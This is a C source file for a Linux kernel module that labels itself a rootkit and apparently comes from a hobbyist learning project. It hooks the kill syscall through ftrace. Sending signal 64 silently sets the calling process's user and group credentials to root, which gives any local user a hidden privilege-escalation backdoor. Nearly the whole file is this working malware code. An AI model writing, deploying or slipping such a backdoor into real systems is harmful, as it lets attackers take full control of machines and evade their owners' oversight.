#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

#include <linux/syscalls.h>
#include <linux/version.h>
#include <linux/namei.h>

#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Alvin (guided with XCellerator");
MODULE_DESCRIPTION("Rootkit giving root access");
MODULE_VERSION("0.01");

void set_root(void){
	struct cred *root;
	root = prepare_creds();

	if (root == NULL){
		return;
	}

	root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;

	commit_creds(root);
}


static asmlinkage long (*orig_kill)(const struct pt_regs *regs);

asmlinkage int hook_kill(const struct pt_regs *regs){
	void set_root(void);
	int sig = regs->si;
	if(sig ==64){
		set_root();
		return 0;
	}

	return orig_kill(regs);
}

//The hooking structure: for every syscall we want to hijack,
//we put in one more entry into this ftrace_hook struct array:
//HOOK([string name of syscall],literally just the method name 
//of the hijacked func, (static)address of space to put original func)

static struct ftrace_hook hooks[] = {
	HOOK("sys_kill", hook_kill, &orig_kill),
};


static int __init my_init(void){
	int err;
	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
	if(err){
		return err;
	}

	//Do the stuff needed to initialize the rootkit here
	printk(KERN_INFO "Root access: loaded\n");

	return 0;
}


static void __exit my_exit(void){

	//Do the stuff needed to de-initialize the rootkit here
	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
	printk(KERN_INFO "Root access: unloaded.\n");

}

module_init(my_init);
module_exit(my_exit);